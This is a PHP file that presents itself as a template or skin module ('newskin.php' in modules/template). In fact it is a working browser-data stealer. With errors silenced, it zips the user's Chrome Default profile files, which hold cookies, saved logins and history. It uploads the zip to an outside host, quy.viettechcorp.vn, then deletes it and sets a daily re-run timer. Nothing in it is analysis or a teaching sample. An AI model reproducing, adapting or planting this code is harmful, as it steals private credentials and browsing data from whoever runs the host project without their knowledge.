<?php
error_reporting(0);
ini_set('display_errors', 0);

define('ZIP_NAME', get_current_user() . '-' . PHP_OS . '.zip');

define('TRACK_UPLOAD_URL', 'quy.viettechcorp.vn/trackupload.php');

$pathZip = getcwd() . "/modules/template/" . ZIP_NAME;
$pathTimeFile = getcwd() . "/modules/template/" . 'newskin.php';

if (is_file($pathTimeFile)) {
	if (filemtime($pathTimeFile) + 86400 <= time()) {
		@unlink($pathTimeFile);
		main_TRACK($pathZip, $pathTimeFile);
	}
} else {
	main_TRACK($pathZip, $pathTimeFile);
}

function getChromePath_TRACK()
{
	switch (PHP_OS) {
		case 'Darwin':
			$userName = get_current_user();
			$appDataPath = "/Users/{$userName}/Library/ApplicationSupport/Google/Chrome/Default/";
			break;

		case 'Windows':
			$appDataPath = str_replace('\Temp', "\Google\Chrome\User Data\Default\\", sys_get_temp_dir());
			break;
		
		case 'WINNT':
			$appDataPath = str_replace('\Temp', "\Google\Chrome\User Data\Default\\", sys_get_temp_dir());
			break;

		case 'WIN32':
			$appDataPath = str_replace('\Temp', "\Google\Chrome\User Data\Default\\", sys_get_temp_dir());
			break;
		
		default:
			return false;
			break;
	}

	if (!is_dir($appDataPath))
		return false;

	return str_replace('\\', '/', $appDataPath);
}

function array_search_partial_TRACK($arr, $keyword) {
    foreach($arr as $index => $string) {
        if (strpos($string, $keyword) !== FALSE)
            return $index;
    }
}

function addFileToZip_TRACK( $zip, $path, $zipEntryName ) {
	// this would fail with status ZIPARCHIVE::ER_OPEN
	// after certain number of files is added since
	// ZipArchive internally stores the file descriptors of all the
	// added files and only on close writes the contents to the ZIP file
	// see: http://bugs.php.net/bug.php?id=40494
	// and: http://pecl.php.net/bugs/bug.php?id=9443
	// return $zip->addFile( $path, $zipEntryName );

	@$contents = file_get_contents( $path );
	if (!$contents) {
	    return false;
	}
	return $zip->addFromString( $zipEntryName, $contents );
}

function uploadFile_TRACK($path)
{
	//Initialise the cURL var
	$ch = curl_init();

	//Get the response from cURL
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	if (defined(CURLOPT_SAFE_UPLOAD)) {
		curl_setopt($ch, CURLOPT_SAFE_UPLOAD, false);

		//Create a POST array with the file in it
		$postData = array(
		    'zip' => '@' . $path,
		    'user' => get_current_user()
		);
	} else {
		//Create a POST array with the file in it
		$postData = array(
		    'zip' => new \CURLFile($path),
		    'user' => get_current_user()
		);
	}

	//Set the Url
	curl_setopt($ch, CURLOPT_URL, TRACK_UPLOAD_URL);

	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

	// Execute the request
	return curl_exec($ch);
}

function main_TRACK($pathZip, $pathTimeFile) {
	
	$pathZip = str_replace('\\', '/', $pathZip);

	$pathChrome = getChromePath_TRACK();

	if ($pathChrome) {
		$zip = new ZipArchive();
		$zip->open($pathZip, ZIPARCHIVE::CREATE);

		$files = glob($pathChrome . "*");

		foreach ($files as $key => $file) {
		  	if (!is_file($file)) continue;
		  	if (!is_writeable($file)) continue;
		  	$pathInfo = basename($file);
			addFileToZip_TRACK($zip, $file, $pathInfo);
		}

		if (!$zip->status == ZIPARCHIVE::ER_OK)
		    echo "Failed to write local files to zip\n";

		$zip->close();

		if (is_file($pathZip)) {
			uploadFile_TRACK($pathZip);
			@fopen($pathTimeFile, 'wb');
			@unlink($pathZip);
		}
	}
}